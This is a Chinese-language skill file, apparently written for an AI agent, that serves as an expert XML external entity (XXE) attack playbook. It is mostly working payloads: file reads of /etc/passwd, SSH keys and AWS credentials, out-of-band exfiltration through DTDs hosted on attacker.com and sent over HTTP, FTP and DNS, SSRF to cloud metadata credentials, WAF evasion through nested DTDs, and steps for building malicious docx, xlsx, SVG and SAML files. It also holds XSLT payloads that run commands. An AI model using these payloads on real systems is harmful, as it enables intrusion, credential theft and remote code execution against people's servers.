# 技能：XML外部实体注入（XXE）——专家攻击手册

> **AI 加载指令**：专家级XXE技术。涵盖所有注入场景（SOAP、REST JSON→XML解析器、Office文件、SVG），OOB（带外）数据外泄（当直接读取失败时至关重要）、盲XXE检测以及XXE到SSRF链。基础模型常会遗漏OOB和非XML上下文XXE。针对现实世界的CVE链，包含Office docx XXE分步操作、PHP expect://远程代码执行（RCE）以及Solr XXE+RCE，加载配套的[SCENARIOS.md](./SCENARIOS.md)。

## 0. 相关路由

同时加载：

- 当XXE可通过SVG、OOXML、导入或预览管道访问时，加载[upload insecure files](../upload-insecure-files/SKILL.md)

### 扩展场景

当您需要时，同时加载[SCENARIOS.md](./SCENARIOS.md)：

- Apache Solr XXE + RCE链（CVE-2017-12629）— XXE读取配置，然后使用VelocityResponseWriter进行RCE
- Office docx XXE分步操作 — 解压 → 在`word/document.xml`或`[Content_Types].xml`中注入DOCTYPE → 重新打包 → 上传
- 基于DOCTYPE的盲SSRF — `PUBLIC`外部DTD引用触发HTTP回调而不反射实体
- 通过XXE的PHP `expect://`协议 — 当expect扩展安装时直接命令执行
- 通过错误消息的盲XXE — 强制文件路径错误在异常文本中泄露内容
- SOAP Web服务的XXE — 将实体注入SOAP Envelope/Body元素

---

## 1. 经典XXE载荷

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

如果`/etc/passwd`在响应中反射 → 确认文件读取。

---

## 2. 攻击面发现

### 直接XML输入
- SOAP端点（`text/xml`，`application/soap+xml`）
- 接受`application/xml`的REST API
- 文件上传：`.xlsx`，`.docx`，`.pptx`（Office Open XML）
- SVG上传（SVG是XML）
- RSS/Atom解析器
- 使用XML配置导入的Web服务

### 非明显的XML处理
更改**任何** JSON POST的`Content-Type`标头为：
```
Content-Type: application/xml
```
然后将正文重写为XML — 许多后端使用双格式解析器或自动检测。

### PDF生成器
某些HTML→PDF工具（wkhtmltopdf，PrinceXML）通过嵌入式URL执行SSRF，但也解析包含在HTML中的SVG/XML中的外部实体。

---

## 3. OOB（带外）XXE — 关键

当直接实体反射失败（服务器解析但不回显实体内容）时使用：

### 第1步：盲检测
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```
DNS/HTTP命中协作者 → 确认XXE（即使没有文件内容返回）。

### 第2步：通过攻击者托管DTD的OOB文件外泄
**攻击者服务器在`http://attacker.com/evil.dtd`托管恶意DTD**：
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

**发送到目标的载荷**：
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```
文件内容出现在攻击者HTTP服务器请求日志中。

### 第3步：基于错误的OOB（当HTTP被阻止时为替代方案）
使用故意错误在错误消息中泄露数据：
```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---

## 4. XXE文件读取目标

**Linux**：
```
/etc/passwd
/etc/shadow  (需要root权限)
/etc/hosts
/proc/self/environ      ← 环境变量（DB凭据、API密钥）
/proc/self/cmdline      ← 进程命令行
/var/log/apache2/access.log  ← 可能包含URL中的密码
/home/USER/.ssh/id_rsa  ← SSH私钥
/home/USER/.aws/credentials ← AWS密钥
/home/USER/.bash_history
```

**Windows**：
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    ← ASP.NET连接字符串
C:\xampp\htdocs\wp-config.php    ← WordPress DB凭据
C:\Users\Administrator\.ssh\id_rsa
```

---

## 5. SVG XXE（文件上传上下文）

当接受并服务/处理SVG上传时：
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```
作为`.svg`上传 → `GET /uploads/file.svg` → 响应中包含文件内容。

---

## 6. OFFICE文件XXE（docx/xlsx/pptx）

Office文件是包含XML的ZIP存档。注入到`[Content_Types].xml`或`word/document.xml`：

```bash
# 第1步：提取
unzip original.docx -d extracted/

# 第2步：编辑word/document.xml — 添加恶意DTD
# 在`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>`之后添加：
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# 然后在文档文本中使用&xxe;

# 第3步：重新打包
cd extracted && zip -r ../malicious.docx .
```

---

## 7. SOAP端点XXE

SOAP请求按定义解析XML。将外部实体注入SOAP信封：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## 8. XXE → SSRF链

XXE外部实体可以指向内部HTTP端点（与SSRF相同）：
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```
这结合了XXE文件读取+SSRF到单个载荷中。

---

## 9. XInclude攻击

当服务器端处理XInclude（从另一个源导入XML），但您无法控制DOCTYPE时：
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

在：Apache Cocoon、Xerces-J、libxml2启用XInclude支持时。

---

## 10. XXE中的协议处理器

```xml
<!-- HTTP (SSRF) -->
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">

<!-- 文件读取 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP包装器（如果PHP使用libxml2） -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- 在响应中解码base64以获取文件内容 -->

<!-- FTP（外泄/端口扫描） -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/x">

<!-- Gopher（Redis、SMTP） -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">
```

---

## 11. 绕过防御

### 解析器阻止DOCTYPE
尝试XInclude（无需DOCTYPE，见§9）。

### 仅允许特定XML模式
如果发生模式验证：在模式验证后但在实体处理之前注入注释或CDATA。

### 响应编码问题（响应中包含二进制）
使用PHP过滤器进行base64：
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### OOB的网络限制
使用DNS-only OOB via `SYSTEM "file://HASH.attacker.com"` — 无需HTTP，DNS查询泄露数据。

---

## 12. 快速检测清单

```
□ 查找XML输入点（或JSON→XML转换）
□ 发送基本实体：<!ENTITY xxe "test"> → &xxe;在正文 → 是否反射"test"？
□ 如果是 → 文件读取：SYSTEM "file:///etc/passwd"
□ 如果不反射 → 通过协作者URL进行OOB测试
□ 如果OOB命中 → 设置攻击者DTD进行文件外泄
□ 尝试带有XXE的SVG上传
□ 尝试在JSON端点上使用Content-Type: application/xml
□ 如果基于DOCTYPE失败，尝试XInclude
```

---

## 13. 本地DTD注入（盲XXE放大）

当外部实体被阻止，但服务器上存在本地DTD文件时：

### 技术

```xml
<!-- 覆盖本地DTD文件中定义的实体 -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### 常见本地DTD路径

#### Linux

```
/usr/share/yelp/dtd/docbookx.dtd           # GNOME帮助
/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig
/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
/usr/share/struts/struts-config_1_0.dtd     # Apache Struts
/usr/share/nmap/nmap.dtd                    # Nmap
/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP
```

#### Windows

```
C:\Windows\System32\wbem\xml\cim20.dtd            # WMI
C:\Windows\System32\wbem\xml\wmi20.dtd             # WMI
C:\Program Files\IBM\WebSphere\*.dtd               # WebSphere
C:\Program Files (x86)\Lotus\*.dtd                 # Lotus Notes
```

#### 在JAR文件内部（Java应用程序）

```
jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
```

### 为什么这有效

- 外部连接被阻止（防火墙/WAF/出口过滤器）
- 但文件://到本地文件通常被允许
- 本地DTD被信任 → 实体覆盖注入攻击者控制的定义
- 错误消息或通过file://的盲提取仍然有效

---

## 14. 额外的OOB外泄通道

### 基于FTP的外泄（逐行）

FTP协议逐行发送数据，使其适用于多行文件外泄，当基于HTTP的OOB在新行处截断时：

```xml
<!-- attacker.com/ftp-exfil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%exfil;
%send;
```

在端口2121上运行一个流氓FTP服务器（例如`xxeserv`或自定义Python） — 每行文件作为单独的`RETR`或`CWD`命令到达。

### HTTP参数外泄

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%exfil;
%send;
```

base64编码避免了HTTP URL中的换行符/特殊字符问题。在攻击者服务器上解码`d=`参数。

---

## 15. DTD嵌套技巧 — 参数实体链

### 参数实体内的参数实体

用于绕过阻止在实体值中直接实体引用的解析器：

```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x25; b;">
  <!ENTITY % b SYSTEM "http://attacker.com/chain.dtd">
  %a;
]>
```

解析器展开`%a;` → `%b;` → 获取外部DTD。一些WAF仅检查实体定义的第一级。

### 三重嵌套用于过滤器规避

```xml
<!-- attacker.com/stage1.dtd -->
<!ENTITY % s2 SYSTEM "http://attacker.com/stage2.dtd">
%s2;

<!-- attacker.com/stage2.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % s3 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%s3;
%exfil;
```

发送到目标的载荷仅引用`stage1.dtd` — 实际文件读取发生在两个DTD获取深处，规避浅层WAF检查。

---

## 16. 非明显格式中的XXE

| 格式 | XML位置 | 注入点 |
|------|-------------|-----------------|
| **SOAP信封** | 整个正文是XML | 在`<soap:Envelope>`之前添加DOCTYPE |
| **SVG图像** | SVG是XML | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`在SVG头中 |
| **OOXML (.docx)** | `word/document.xml`，`[Content_Types].xml` | 在任何XML成员中注入DOCTYPE + 实体 |
| **OOXML (.xlsx)** | `xl/sharedStrings.xml`，`xl/worksheets/sheet1.xml` | 单元格值中的实体引用 |
| **RSS/Atom源** | 源正文是XML | 如果用户内容被包含，则注入源项 |
| **SAML断言** | SAML XML令牌 | 在`SAMLResponse`参数中注入DOCTYPE（base64解码的XML） |
| **XMPP** | 协议消息是XML Stanza | 消息正文或JID字段中的实体 |
| **GPX文件** | GPS轨迹数据在XML中 | 通过接受GPX的文件上传端点 |
| **XHTML** | 严格XHTML是有效的XML | 在XHTML文档中注入DOCTYPE |

### SAML XXE

```xml
<!-- base64解码SAMLResponse，注入DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

重新编码为base64，作为`SAMLResponse`参数提交。

---

## 17. 通过文件上传的XXE

### SVG上传

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

作为头像/图像上传 → 查看上传的SVG → 渲染文本的文件内容。

### XLSX（Excel）上传

```bash
# 1. 创建最小的.xlsx，解压它
unzip report.xlsx -d xlsx_tmp/

# 2. 注入到xl/sharedStrings.xml
# 在XML声明之后添加：
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# 用&xxe;替换一个<t>元素的内容

# 3. 重新打包
cd xlsx_tmp && zip -r ../malicious.xlsx .
```

或者注入到`[Content_Types].xml`（大多数OOXML处理器首先解析）。

### DOCX上传

```bash
# 目标：word/document.xml
# 相同方法：解压 → 注入DOCTYPE + 实体 → 重新打包

# 替代方案：如果存在自定义XML部分，注入到customXml/item1.xml
```

### 处理管道攻击

即使上传的文件没有被直接渲染，服务器端解析器（Apache POI、python-docx、OpenXML SDK）在导入期间处理实体，可能触发OOB外泄。

---

## 18. 基于错误的XXE

强制XML解析器生成包含文件内容的错误消息：

### 方法1：不存在的文件引用

```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

解析器尝试打开`file:///nonexistent/<hostname_content>` → 错误消息包含主机名值。

### 方法2：XML模式验证错误

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>">
  %eval;
  %err;
]>
```

`jar:`协议处理程序生成详细错误消息，其中包含展开的实体值。

### 方法3：整数溢出/类型错误

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'file:///%file;'>">
%int;
%trick;
```

解析器尝试打开包含目标文件内容的文件路径 → 错误消息揭示内容。

---

## 19. XSLT注入与XXE的关联

XSLT处理器解析XML，可以与XXE链式处理：

### XSLT文件读取

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XSLT RCE（处理器依赖）

```xml
<!-- Xalan-J (Java) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP (libxslt with registerPHPFunctions) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XXE → XSLT链

如果目标接受带有样式表引用的XML输入（`<?xml-stylesheet?>`），注入外部实体和恶意XSLT以从文件读取提升到RCE。
